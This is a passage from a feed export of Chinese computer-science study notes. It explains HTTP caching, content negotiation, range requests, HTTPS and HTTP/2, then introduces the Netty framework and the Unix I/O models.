<p>需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 <code>http://www.google.com/</code> 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。</p>
<div><pre><code>ETag: "82e22293907ce725faf67773957acd12"
</code></pre></div><p>可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。</p>
<div><pre><code>If-None-Match: "82e22293907ce725faf67773957acd12"
</code></pre></div><p>Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 304 Not Modified 响应报文。</p>
<div><pre><code>Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre></div><div><pre><code>If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre></div><h2 id="内容协商" tabindex="-1"> 内容协商</h2>
<p>通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。</p>
<h3 id="_1-类型" tabindex="-1"> 1. 类型</h3>
<p><strong>1.1 服务端驱动型</strong></p>
<p>客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。</p>
<p>它存在以下问题：</p>
<ul>
<li>服务器很难知道客户端浏览器的全部信息；</li>
<li>客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；</li>
<li>给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。</li>
</ul>
<p><strong>1.2 代理驱动型</strong></p>
<p>服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。</p>
<h3 id="_2-vary" tabindex="-1"> 2. Vary</h3>
<div><pre><code>Vary: Accept-Language
</code></pre></div><p>在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。</p>
<p>例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 <code>Vary: Accept-Language</code> 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。</p>
<h2 id="内容编码" tabindex="-1"> 内容编码</h2>
<p>内容编码将实体主体进行压缩，从而减少传输的数据量。</p>
<p>常用的内容编码有：gzip、compress、deflate、identity。</p>
<p>浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 Content-Encoding。</p>
<h2 id="范围请求" tabindex="-1"> 范围请求</h2>
<p>如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。</p>
<h3 id="_1-range" tabindex="-1"> 1. Range</h3>
<p>在请求报文中添加 Range 首部字段指定请求的范围。</p>
<div><pre><code>GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
</code></pre></div><p>请求成功的话服务器返回的响应包含 206 Partial Content 状态码。</p>
<div><pre><code>HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
</code></pre></div><h3 id="_2-accept-ranges" tabindex="-1"> 2. Accept-Ranges</h3>
<p>响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。</p>
<div><pre><code>Accept-Ranges: bytes
</code></pre></div><h3 id="_3-响应状态码" tabindex="-1"> 3. 响应状态码</h3>
<ul>
<li>在请求成功的情况下，服务器会返回 206 Partial Content 状态码。</li>
<li>在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。</li>
<li>在不支持范围请求的情况下，服务器会返回 200 OK 状态码。</li>
</ul>
<h2 id="分块传输编码" tabindex="-1"> 分块传输编码</h2>
<p>Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。</p>
<h2 id="多部分对象集合" tabindex="-1"> 多部分对象集合</h2>
<p>一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。</p>
<p>例如，上传多个表单时可以使用如下方式：</p>
<div><pre><code>Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; name="submit-name"

Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="虚拟主机" tabindex="-1"> 虚拟主机</h2>
<p>HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。</p>
<h2 id="通信数据转发" tabindex="-1"> 通信数据转发</h2>
<h3 id="_1-代理" tabindex="-1"> 1. 代理</h3>
<p>代理服务器接受客户端的请求，并且转发给其它服务器。</p>
<p>使用代理的主要目的是：</p>
<ul>
<li>缓存</li>
<li>负载均衡</li>
<li>网络访问控制</li>
<li>访问日志记录</li>
</ul>
<p>代理服务器分为正向代理和反向代理两种：</p>
<ul>
<li>用户察觉得到正向代理的存在。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a314bb79-5b18-4e63-a976-3448bffa6f1b.png" width=""/> </div><br>
<ul>
<li>而反向代理一般位于内部网络中，用户察觉不到。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2d09a847-b854-439c-9198-b29c65810944.png" width=""/> </div><br>
<h3 id="_2-网关" tabindex="-1"> 2. 网关</h3>
<p>与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。</p>
<h3 id="_3-隧道" tabindex="-1"> 3. 隧道</h3>
<p>使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。</p>
<h1 id="五、https" tabindex="-1"> 五、HTTPS</h1>
<p>HTTP 有以下安全性问题：</p>
<ul>
<li>使用明文进行通信，内容可能会被窃听；</li>
<li>不验证通信方的身份，通信方的身份有可能遭遇伪装；</li>
<li>无法证明报文的完整性，报文有可能遭篡改。</li>
</ul>
<p>HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。</p>
<p>通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ssl-offloading.jpg" width="700"/> </div><br>
<h2 id="加密" tabindex="-1"> 加密</h2>
<h3 id="_1-对称密钥加密" tabindex="-1"> 1. 对称密钥加密</h3>
<p>对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。</p>
<ul>
<li>优点：运算速度快；</li>
<li>缺点：无法安全地将密钥传输给通信方。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7fffa4b8-b36d-471f-ad0c-a88ee763bb76.png" width="600"/> </div><br>
<h3 id="_2-非对称密钥加密" tabindex="-1"> 2. 非对称密钥加密</h3>
<p>非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。</p>
<p>公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。</p>
<p>非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。</p>
<ul>
<li>优点：可以更安全地将公开密钥传输给通信发送方；</li>
<li>缺点：运算速度慢。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/39ccb299-ee99-4dd1-b8b4-2f9ec9495cb4.png" width="600"/> </div><br>
<h3 id="_3-https-采用的加密方式" tabindex="-1"> 3. HTTPS 采用的加密方式</h3>
<p>HTTPS 采用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证传输过程的安全性，之后使用对称密钥加密进行通信来保证通信过程的效率。（下图中的 Session Key 就是对称密钥）</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/How-HTTPS-Works.png" width="600"/> </div><br>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-28-15-17-29.png" alt="" loading="lazy"></p>
<h2 id="认证" tabindex="-1"> 认证</h2>
<p>通过使用  <strong>证书</strong>  来对通信方进行认证。</p>
<p>数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。</p>
<p>服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。</p>
<p>进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2017-06-11-ca.png" width=""/> </div><br>
<h2 id="完整性保护" tabindex="-1"> 完整性保护</h2>
<p>SSL 提供报文摘要功能来进行完整性保护。</p>
<p>HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。</p>
<p>HTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。</p>
<h2 id="https-的缺点" tabindex="-1"> HTTPS 的缺点</h2>
<ul>
<li>因为需要进行加密解密等过程，因此速度会更慢；</li>
<li>需要支付证书授权的高额费用。</li>
</ul>
<h1 id="六、http-1-1-新特性" tabindex="-1"> 六、HTTP/1.1 新特性</h1>
<p>详细内容请见上文</p>
<ul>
<li>默认是长连接</li>
<li>支持流水线</li>
<li>支持同时打开多个 TCP 连接</li>
<li>支持虚拟主机</li>
<li>新增状态码 100</li>
<li>支持分块传输编码</li>
<li>新增缓存处理指令 max-age</li>
</ul>
<h1 id="七、http-2-0" tabindex="-1"> 七、HTTP/2.0</h1>
<h2 id="http-1-x-缺陷" tabindex="-1"> HTTP/1.x 缺陷</h2>
<p>HTTP/1.x 实现简单是以牺牲性能为代价的：</p>
<ul>
<li>客户端需要使用多个连接才能实现并发和缩短延迟；</li>
<li>不会压缩请求和响应首部，从而导致不必要的网络流量；</li>
<li>不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。</li>
</ul>
<h2 id="二进制分帧层" tabindex="-1"> 二进制分帧层</h2>
<p>HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"/> </div><br>
<p>在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。</p>
<ul>
<li>一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。</li>
<li>消息（Message）是与逻辑请求或响应对应的完整的一系列帧。</li>
<li>帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"/> </div><br>
<h2 id="服务端推送" tabindex="-1"> 服务端推送</h2>
<p>HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"/> </div><br>
<h2 id="首部压缩" tabindex="-1"> 首部压缩</h2>
<p>HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。</p>
<p>HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。</p>
<p>不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/_u4E0B_u8F7D.png" width="600"/> </div><br>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP" target="_blank" rel="noopener noreferrer">MDN : HTTP</a></li>
<li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener noreferrer">HTTP/2 简介</a></li>
<li><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener noreferrer">htmlspecialchars</a></li>
<li><a href="http://java2db.com/java-io/how-to-get-and-the-difference-between-file-uri-and-url-in-java" target="_blank" rel="noopener noreferrer">Difference between file URI and URL in java</a></li>
<li><a href="https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement" target="_blank" rel="noopener noreferrer">How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement</a></li>
<li><a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" target="_blank" rel="noopener noreferrer">浅谈 HTTP 中 Get 与 Post 的区别</a></li>
<li><a href="https://www.webdancers.com/are-http-and-www-necesary/" target="_blank" rel="noopener noreferrer">Are http:// and www really necessary?</a></li>
<li><a href="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" target="_blank" rel="noopener noreferrer">HTTP (HyperText Transfer Protocol)</a></li>
<li><a href="https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/" target="_blank" rel="noopener noreferrer">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a></li>
<li><a href="http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg" target="_blank" rel="noopener noreferrer">File:HTTP persistent connection.svg</a></li>
<li><a href="https://en.wikipedia.org/wiki/Proxy_server" target="_blank" rel="noopener noreferrer">Proxy server</a></li>
<li><a href="https://www.x-cart.com/blog/what-is-https-and-ssl.html" target="_blank" rel="noopener noreferrer">What Is This HTTPS/SSL Thing And Why Should You Care?</a></li>
<li><a href="https://securebox.comodo.com/ssl-sniffing/ssl-offloading/" target="_blank" rel="noopener noreferrer">What is SSL Offloading?</a></li>
<li><a href="https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html" target="_blank" rel="noopener noreferrer">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a></li>
<li><a href="https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication" target="_blank" rel="noopener noreferrer">An Introduction to Mutual SSL Authentication</a></li>
<li><a href="https://danielmiessler.com/study/url-uri/" target="_blank" rel="noopener noreferrer">The Difference Between URLs and URIs</a></li>
<li><a href="https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment" target="_blank" rel="noopener noreferrer">Cookie 与 Session 的区别</a></li>
<li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener noreferrer">COOKIE 和 SESSION 有什么区别</a></li>
<li><a href="https://harttle.land/2015/08/10/cookie-session.html" target="_blank" rel="noopener noreferrer">Cookie/Session 的机制与安全</a></li>
<li><a href="https://shijianan.com/2017/06/11/https/" target="_blank" rel="noopener noreferrer">HTTPS 证书原理</a></li>
<li><a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" target="_blank" rel="noopener noreferrer">What is the difference between a URI, a URL and a URN?</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener noreferrer">XMLHttpRequest</a></li>
<li><a href="https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/" target="_blank" rel="noopener noreferrer">XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?</a></li>
<li><a href="https://www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences" target="_blank" rel="noopener noreferrer">Symmetric vs. Asymmetric Encryption – What are differences?</a></li>
<li><a href="https://www.kancloud.cn/digest/web-performance-http2" target="_blank" rel="noopener noreferrer">Web 性能优化与 HTTP/2</a></li>
<li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener noreferrer">HTTP/2 简介</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Netty.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Netty.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="介绍" tabindex="-1"> 介绍</h1>
<p>Netty 是一个利用 Java 的高级网络的能力，隐藏其背后的复杂性而提供一个易于使用的 API 的客户端/服务器框架。</p>
<p>Netty是一个异步、基于事件驱动的网络应用程序框架，其对 Java NIO进行了封装，大大简化了 TCP 或者 UDP 服务器的网络编程。</p>
<h2 id="netty优势" tabindex="-1"> Netty优势</h2>
<ul>
<li>并发高</li>
<li>传输快</li>
<li>封装好</li>
</ul>
<h2 id="核心组件" tabindex="-1"> 核心组件</h2>
<ul>
<li>Bootstrap和ServerBootstrap：Netty应用程序通过设置bootstrap引导类来完成，该类提供了一个用于应用程序网络层配置的容器。Bootstrap服务端的是ServerBootstrap，客户端的是Bootstrap。</li>
<li>Channel：Netty 中的接口 Channel 定义了与 socket 丰富交互的操作集：bind, close, config, connect, isActive, isOpen, isWritable, read, write 等等。</li>
<li>ChannelHandler：ChannelHandler 支持很多协议，并且提供用于数据处理的容器，ChannelHandler由特定事件触发， 常用的一个接口是ChannelInboundHandler，该类型处理入站读数据（socket读事件）。</li>
<li>ChannelPipeline：ChannelPipeline 提供了一个容器给 ChannelHandler 链并提供了一个API 用于管理沿着链入站和出站事件的流动。每个 Channel 都有自己的ChannelPipeline，当 Channel 创建时自动创建的</li>
<li>EventLoop：EventLoop 用于处理 Channel 的 I/O 操作。一个单一的 EventLoop通常会处理多个 Channel 事件。一个 EventLoopGroup 可以含有多于一个的 EventLoop 和 提供了一种迭代用于检索清单中的下一个。</li>
<li>ChannelFuture：Netty 所有的 I/O 操作都是异步。因为一个操作可能无法立即返回，我们需要有一种方法在以后获取它的结果。出于这个目的，Netty 提供了接口 ChannelFuture,它的 addListener 方法</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-14-10-17-29.png" alt="" loading="lazy"></p>
<p>Netty 是一个非阻塞、事件驱动的网络框架。Netty 实际上是使用 Threads（ 多线程） 处理 I/O事件的，对于熟悉多线程编程的读者可能会需要关注同步代码。这样的方式不好，因为同步会影响程序的性能，Netty 的设计保证程序处理事件不会有同步。因为某个Channel事件是被添加到一个EventLoop中的，以后该Channel事件都是由该EventLoop来处理的，而EventLoop是一个线程来处理的，也就是说Netty不需要同步IO操作，EventLoop与EventLoopGroup的关系可以理解为线程与线程池的关系一样。</p>
<h2 id="线程模型" tabindex="-1"> 线程模型</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-14-09-40-25.png" alt="" loading="lazy"></p>
<p>上图下侧为Netty Server端,当NettyServer启动时候会创建两个NioEventLoopGroup线程池组，其中boss组用来接受客户端发来的连接，worker组则负责对完成TCP三次握手的连接进行处理；如上图每个NioEventLoopGroup里面包含了多个NioEventLoop，每个NioEventLoop中包含了一个NIO Selector、一个队列、一个线程；其中线程用来做轮询注册到Selector上的Channel的读写事件和对投递到队列里面的事件进行处理。</p>
<p>当NettyServer启动时候会注册监听套接字通道NioServerSocketChannel到boss线程池组中的某一个NioEventLoop管理的Selector上，然后其对应的线程则会负责轮询该监听套接字上的连接请求；当客户端发来一个连接请求时候，boss线程池组中注册了监听套接字的NioEventLoop中的Selector会读取读取完成了TCP三次握手的请求，然后创建对应的连接套接字通道NioSocketChannel，然后把其注册到worker线程池组中的某一个NioEventLoop中管理的一个NIO Selector上，然后该连接套接字通道NioSocketChannel上的所有读写事件都由该NioEventLoop管理。当客户端发来多个连接时候，NettyServer端则会创建多个NioSocketChannel，而worker线程池组中的NioEventLoop是有个数限制的，所以Netty有一定的策略把很多NioSocketChannel注册到不同的NioEventLoop上，也就是每个NioEventLoop中会管理好多客户端发来的连接，然后通过循环轮询处理每个连接的读写事件。</p>
<p>如上图上侧部分为Netty Client部分，当NettyClient启动时候会创建一个NioEventLoopGroup，用来发起请求并对建立TCP三次连接的套接字的读写事件进行处理。当调用Bootstrap的connect方法发起连接请求后内部会创建一个NioSocketChannel用来代表该请求，并且会把该NioSocketChannel注册到NioSocketChannel管理的某个NioEventLoop的Selector上，然后该NioEventLoop的读写事件都有该NioEventLoop负责处理。</p>
<p>Netty之所以说是异步非阻塞网络框架是因为通过NioSocketChannel的write系列方法向连接里面写入数据时候是非阻塞的，马上会返回的，即使调用写入的线程是我们的业务线程，这是Netty通过在ChannelPipeline中判断调用NioSocketChannel的write的调用线程是不是其对应的NioEventLoop中的线程来实现的，如果发现不是则会把写入请求封装为WriteTask投递到其对应的NioEventLoop中的队列里面，然后等其对应的NioEventLoop中的线程轮询连接套接字的读写事件时候捎带从队列里面取出来执行；总结说就是每个NioSocketChannel对应的读写事件都是在其对应的NioEventLoop管理的单线程内执行，对同一个NioSocketChannel不存在并发读写，所以无需加锁处理。</p>
<p>另外当从NioSocketChannel中读取数据时候，并不是使用业务线程来阻塞等待，而是等NioEventLoop中的IO轮询线程发现Selector上有数据就绪时候，通过事件通知方式来通知我们业务数据已经就绪，可以来读取并处理了。</p>
<p>总结一句话就是使用Netty框架进行网络通信时候，当我们发起请求后请求会马上返回，而不会阻塞我们的业务调用线程；如果我们想要获取请求的响应结果，也不需要业务调用线程使用阻塞的方式来等待，而是当响应结果出来时候使用IO线程异步通知业务的方式，可知在整个请求-响应过程中业务线程不会由于阻塞等待而不能干其他事情。</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">网络</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、I/O 模型</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Socket.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Socket.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、i-o-模型" tabindex="-1"> 一、I/O 模型</h1>
<p>一个输入操作通常包括两个阶段：</p>
<ul>
<li>等待数据准备好</li>
<li>从内核向进程复制数据</li>
</ul>
<p>对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。</p>
<p>Unix 有五种 I/O 模型：</p>
<ul>
<li>阻塞式 I/O</li>
<li>非阻塞式 I/O</li>
<li>I/O 复用（select 和 poll）</li>
<li>信号驱动式 I/O（SIGIO）</li>
<li>异步 I/O（AIO）</li>
</ul>
<h2 id="阻塞式-i-o" tabindex="-1"> 阻塞式 I/O</h2>
<p>应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。</p>
<p>应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。</p>
<p>下图中，recvfrom() 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。</p>
<div><pre><code><span>ssize_t</span> <span>recvfrom</span><span>(</span><span>int</span> sockfd<span>,</span> <span>void</span> <span>*</span>buf<span>,</span> <span>size_t</span> len<span>,</span> <span>int</span> flags<span>,</span> <span>struct</span> <span>sockaddr</span> <span>*</span>src_addr<span>,</span> <span>socklen_t</span> <span>*</span>addrlen<span>)</span><span>;</span>
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492928416812_4.png"/> </div><br>
<h2 id="非阻塞式-i-o" tabindex="-1"> 非阻塞式 I/O</h2>
<p>应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。</p>
<p>由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929000361_5.png"/> </div><br>
<h2 id="i-o-复用" tabindex="-1"> I/O 复用</h2>
<p>使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程会被阻塞，当某一个套接字可读时返回，之后再使用 recvfrom 把数据从内核复制到进程中。</p>
<p>它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。</p>
<p>如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929444818_6.png"/> </div><br>
<h2 id="信号驱动-i-o" tabindex="-1"> 信号驱动 I/O</h2>
<p>应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。</p>
<p>相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929553651_7.png"/> </div><br>
<h2 id="异步-i-o" tabindex="-1"> 异步 I/O</h2>
<p>应用进程执行 aio_read 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。</p>
<p>异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492930243286_8.png"/> </div><br>
<h2 id="五大-i-o-模型比较" tabindex="-1"> 五大 I/O 模型比较</h2>
<ul>
<li>同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。</li>
<li>异步 I/O：第二阶段应用进程不会阻塞。</li>
</ul>
<p>同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。</p>
<p>非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492928105791_3.png"/> </div><br>
<h1 id="二、i-o-复用" tabindex="-1"> 二、I/O 复用</h1>
<p>select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。</p>
<h2 id="文件描述符" tabindex="-1"> 文件描述符</h2>
<p>文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。</p>
